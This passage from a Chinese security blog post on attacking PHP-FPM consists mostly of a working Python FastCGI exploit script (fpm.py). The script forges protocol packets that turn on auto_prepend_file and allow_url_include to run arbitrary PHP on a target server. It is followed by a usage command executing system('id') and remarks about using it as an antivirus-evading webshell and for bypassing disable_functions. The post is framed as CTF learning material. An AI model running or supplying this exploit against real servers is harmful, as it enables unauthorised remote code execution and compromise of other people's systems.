class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">import socket</span><br><span class="line">import random</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from io import BytesIO</span><br><span class="line"></span><br><span class="line"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><span class="line"></span><br><span class="line">PY2 = True if sys.version_info.major == 2 else False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def bchr(i):</span><br><span class="line">    if PY2:</span><br><span class="line">        return force_bytes(chr(i))</span><br><span class="line">    else:</span><br><span class="line">        return bytes([i])</span><br><span class="line"></span><br><span class="line">def bord(c):</span><br><span class="line">    if isinstance(c, int):</span><br><span class="line">        return c</span><br><span class="line">    else:</span><br><span class="line">        return ord(c)</span><br><span class="line"></span><br><span class="line">def force_bytes(s):</span><br><span class="line">    if isinstance(s, bytes):</span><br><span class="line">        return s</span><br><span class="line">    else:</span><br><span class="line">        return s.encode(&#x27;utf-8&#x27;, &#x27;strict&#x27;)</span><br><span class="line"></span><br><span class="line">def force_text(s):</span><br><span class="line">    if issubclass(type(s), str):</span><br><span class="line">        return s</span><br><span class="line">    if isinstance(s, bytes):</span><br><span class="line">        s = str(s, &#x27;utf-8&#x27;, &#x27;strict&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        s = str(s)</span><br><span class="line">    return s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class FastCGIClient:</span><br><span class="line">    &quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # private</span><br><span class="line">    __FCGI_VERSION = 1</span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = 1</span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = 2</span><br><span class="line">    __FCGI_ROLE_FILTER = 3</span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = 1</span><br><span class="line">    __FCGI_TYPE_ABORT = 2</span><br><span class="line">    __FCGI_TYPE_END = 3</span><br><span class="line">    __FCGI_TYPE_PARAMS = 4</span><br><span class="line">    __FCGI_TYPE_STDIN = 5</span><br><span class="line">    __FCGI_TYPE_STDOUT = 6</span><br><span class="line">    __FCGI_TYPE_STDERR = 7</span><br><span class="line">    __FCGI_TYPE_DATA = 8</span><br><span class="line">    __FCGI_TYPE_GETVALUES = 9</span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = 10</span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = 11</span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = 8</span><br><span class="line"></span><br><span class="line">    # request state</span><br><span class="line">    FCGI_STATE_SEND = 1</span><br><span class="line">    FCGI_STATE_ERROR = 2</span><br><span class="line">    FCGI_STATE_SUCCESS = 3</span><br><span class="line"></span><br><span class="line">    def __init__(self, host, port, timeout, keepalive):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        if keepalive:</span><br><span class="line">            self.keepalive = 1</span><br><span class="line">        else:</span><br><span class="line">            self.keepalive = 0</span><br><span class="line">        self.sock = None</span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    def __connect(self):</span><br><span class="line">    	return True</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        # if self.keepalive:</span><br><span class="line">        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br><span class="line">        # else:</span><br><span class="line">        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><span class="line">        try:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        except socket.error as msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = None</span><br><span class="line">            print(repr(msg))</span><br><span class="line">            return False</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):</span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">               + bchr(requestid &amp; 0xFF) \</span><br><span class="line">               + bchr((length &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">               + bchr(length &amp; 0xFF) \</span><br><span class="line">               + bchr(0) \</span><br><span class="line">               + bchr(0) \</span><br><span class="line">               + content</span><br><span class="line">        return buf</span><br><span class="line"></span><br><span class="line">    def __encodeNameValueParams(self, name, value):</span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = b&#x27;&#x27;</span><br><span class="line">        if nLen &lt; 128:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        else:</span><br><span class="line">            record += bchr((nLen &gt;&gt; 24) | 0x80) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">                      + bchr(nLen &amp; 0xFF)</span><br><span class="line">        if vLen &lt; 128:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        else:</span><br><span class="line">            record += bchr((vLen &gt;&gt; 24) | 0x80) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \</span><br><span class="line">                      + bchr(vLen &amp; 0xFF)</span><br><span class="line">        return record + name + value</span><br><span class="line"></span><br><span class="line">    def __decodeFastCGIHeader(self, stream):</span><br><span class="line">        header = dict()</span><br><span class="line">        header[&#x27;version&#x27;] = bord(stream[0])</span><br><span class="line">        header[&#x27;type&#x27;] = bord(stream[1])</span><br><span class="line">        header[&#x27;requestId&#x27;] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])</span><br><span class="line">        header[&#x27;contentLength&#x27;] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])</span><br><span class="line">        header[&#x27;paddingLength&#x27;] = bord(stream[6])</span><br><span class="line">        header[&#x27;reserved&#x27;] = bord(stream[7])</span><br><span class="line">        return header</span><br><span class="line"></span><br><span class="line">    def __decodeFastCGIRecord(self, buffer):</span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        if not header:</span><br><span class="line">            return False</span><br><span class="line">        else:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[&#x27;content&#x27;] = b&#x27;&#x27;</span><br><span class="line">            </span><br><span class="line">            if &#x27;contentLength&#x27; in record.keys():</span><br><span class="line">                contentLength = int(record[&#x27;contentLength&#x27;])</span><br><span class="line">                record[&#x27;content&#x27;] += buffer.read(contentLength)</span><br><span class="line">            if &#x27;paddingLength&#x27; in record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[&#x27;paddingLength&#x27;]))</span><br><span class="line">            return record</span><br><span class="line"></span><br><span class="line">    def request(self, nameValuePairs=&#123;&#125;, post=&#x27;&#x27;):</span><br><span class="line">        if not self.__connect():</span><br><span class="line">            print(&#x27;connect failure! please check your fasctcgi-server !!&#x27;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        requestId = random.randint(1, (1 &lt;&lt; 16) - 1)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = b&quot;&quot;</span><br><span class="line">        beginFCGIRecordContent = bchr(0) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(0) * 5</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = b&#x27;&#x27;</span><br><span class="line">        if nameValuePairs:</span><br><span class="line">            for (name, value) in nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        if paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b&#x27;&#x27;, requestId)</span><br><span class="line"></span><br><span class="line">        if post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b&#x27;&#x27;, requestId)</span><br><span class="line">        print(base64.b64encode(request))</span><br><span class="line">		exit()</span><br><span class="line">		</span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span><br><span class="line">        return self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    def __waitForResponse(self, requestId):</span><br><span class="line">        data = b&#x27;&#x27;</span><br><span class="line">        while True:</span><br><span class="line">            buf = self.sock.recv(512)</span><br><span class="line">            if not len(buf):</span><br><span class="line">                break</span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        while True:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            if not response:</span><br><span class="line">                break</span><br><span class="line">            if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    or response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                if response[&#x27;type&#x27;] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                if requestId == int(response[&#x27;requestId&#x27;]):</span><br><span class="line">                    self.requests[requestId][&#x27;response&#x27;] += response[&#x27;content&#x27;]</span><br><span class="line">            if response[&#x27;type&#x27;] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        return self.requests[requestId][&#x27;response&#x27;]</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;Php-fpm code execution vulnerability client.&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;host&#x27;, help=&#x27;Target host, such as 127.0.0.1&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;file&#x27;, help=&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-c&#x27;, &#x27;--code&#x27;, help=&#x27;What php code your want to execute&#x27;, default=&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, help=&#x27;FastCGI port&#x27;, default=9000, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, 3, 0)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = &quot;/&quot;</span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">        &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,</span><br><span class="line">        &#x27;SCRIPT_FILENAME&#x27;: documentRoot + uri.lstrip(&#x27;/&#x27;),</span><br><span class="line">        &#x27;SCRIPT_NAME&#x27;: uri,</span><br><span class="line">        &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,</span><br><span class="line">        &#x27;REQUEST_URI&#x27;: uri,</span><br><span class="line">        &#x27;DOCUMENT_ROOT&#x27;: documentRoot,</span><br><span class="line">        &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">        &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">        &#x27;REMOTE_PORT&#x27;: &#x27;9985&#x27;,</span><br><span class="line">        &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">        &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">        &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">        &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,</span><br><span class="line">        &#x27;CONTENT_TYPE&#x27;: &#x27;application/text&#x27;,</span><br><span class="line">        &#x27;CONTENT_LENGTH&#x27;: &quot;%d&quot; % len(content),</span><br><span class="line">        &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">        &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br><span class="line">PLAINTEXT</span><br><span class="line">python3 fpm.py -c &quot;&lt;?php system(&#x27;id&#x27;); exit(); ?&gt;&quot; -p 9000 xxx.xxx.xxx.xxx /var/www/html/index.php</span><br><span class="line"></span><br><span class="line">Payload：</span><br><span class="line">直接与 Socket 进行通信，伪造fastcgi协议包进行任意代码执行</span><br><span class="line">POST 方式 cmd 参数传入 base64 编码的 payload</span><br><span class="line"></span><br><span class="line">感觉和上面的有点类似呢。</span><br></pre></td></tr></table></figure>

<p>默认套接字的位置在 <code>/run/php/php7.3-fpm.sock</code></p>
<p>如果不在的话可以通过默认 <code>/etc/php/7.3/fpm/pool.d/www.conf</code> 配置文件查看套接字路径,或者 <code>TCP</code> 模式的端口号</p>
<p>上面可以作为一个有环境要求的免杀webshell，稳妥妥的免杀。还有一种情况是绕过 disable_functions,就是我们上面写的那个（用PHP_ADMIN_VALUE设置extension &#x3D; &#x2F;tmp&#x2F;sky.so）。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>从原理开始讲起，总结归纳了TCP和Unix Socket的攻击方法。</p>
<p>寻找攻击点非常重要。</p>
<p>脚本的修改要根据不同场景灵活变换。</p>
<p>这东西对于小白(我)来说，一开始有点难以理解，现在脑子总算清晰了一点了，后期还需要不断刷题才能对PHP-FPM很熟。</p>
<p>任重道远……</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5006">https://xz.aliyun.com/t/5006</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9544">https://xz.aliyun.com/t/9544</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.carrot2.cn/2022/09/2022zjctf-preliminary.html">https://blog.carrot2.cn/2022/09/2022zjctf-preliminary.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yake-daigua.top">yake-daigua</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yake-daigua.top/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/">https://yake-daigua.top/2022/09/25/PHP-FPM%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yake-daigua.top" target="_blank">yake-daigua</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/PHP-FPM/">PHP-FPM</a></div><div class="post_share"><div class="social-share" data-image="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/%E6%9C%AA%E9%97%BB%E8%8A%B1%E5%90%8D_48518498.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/29/2022%E5%B9%B49%E6%9C%88%E6%80%BB%E7%BB%93/"><img class="prev-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/龍姫_68362502.png" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022年9月总结</div></div></a></div><div class="next-post pull-right"><a href="/2022/09/20/BLOG%E6%90%AD%E5%BB%BA%E5%AE%8C%E6%88%90%E8%AE%B0/"><img class="next-cover" src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic4.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Blog搭建完成</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="author-info__name">yake-daigua</div><div class="author-info__description">爱蜜莉雅,我好喜欢你</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yake-daigua"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到yake-daigua的Blog，不定期更新技术总结文章和个人阶段性学习成果。加油啊，敲键盘的大哥哥。<img src="/img/loading.gif" data-original="https://npm.arcitcgn.cn/aciano-cdn@1.0.10/Yay.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">声明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B5%B7%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">起因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86Nginx%E5%92%8CPHP-FPM"><span class="toc-number">3.</span> <span class="toc-text">认识Nginx和PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%EF%BC%9A"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">Nginx：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-FPM%EF%BC%9A"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">PHP-FPM：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E8%A7%A3"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">图解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TCP%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.0.4.</span> <span class="toc-text">TCP通信方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unix-Socket%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">3.0.0.5.</span> <span class="toc-text">Unix Socket通信方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">3.0.0.6.</span> <span class="toc-text">拓展</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fastcgi%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">Fastcgi协议分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastcgi-Record"><span class="toc-number">4.0.0.1.</span> <span class="toc-text">Fastcgi Record</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastcgi-Type"><span class="toc-number">4.0.0.2.</span> <span class="toc-text">Fastcgi Type</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-FPM%E8%A7%A3%E6%9E%90"><span class="toc-number">4.0.0.3.</span> <span class="toc-text">PHP-FPM解析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04Nginx%EF%BC%88IIS7%EF%BC%89%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">0x04Nginx（IIS7）解析漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">PHP-FPM未授权访问漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP-FPM%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">7.</span> <span class="toc-text">PHP-FPM任意代码执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%94%BB%E5%87%BBPHP-FPM"><span class="toc-number">8.</span> <span class="toc-text">远程攻击PHP-FPM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM"><span class="toc-number">9.</span> <span class="toc-text">SSRF攻击本地PHP-FPM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8fpm-py%E8%84%9A%E6%9C%AC"><span class="toc-number">9.0.0.1.</span> <span class="toc-text">利用fpm.py脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Gopherus"><span class="toc-number">9.0.0.2.</span> <span class="toc-text">利用Gopherus</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E4%B8%AD%E7%9A%84%E6%94%BB%E5%87%BB%E7%82%B9"><span class="toc-number">10.</span> <span class="toc-text">SSRF中的攻击点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#curl-exec"><span class="toc-number">10.0.0.1.</span> <span class="toc-text">curl_exec()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-get-contents"><span class="toc-number">10.0.0.2.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sockopen"><span class="toc-number">10.0.0.3.</span> <span class="toc-text">sockopen()</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FTP%E6%94%BB%E5%87%BBFPM-x2F-FastCGI"><span class="toc-number">11.</span> <span class="toc-text">FTP攻击FPM&#x2F;FastCGI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 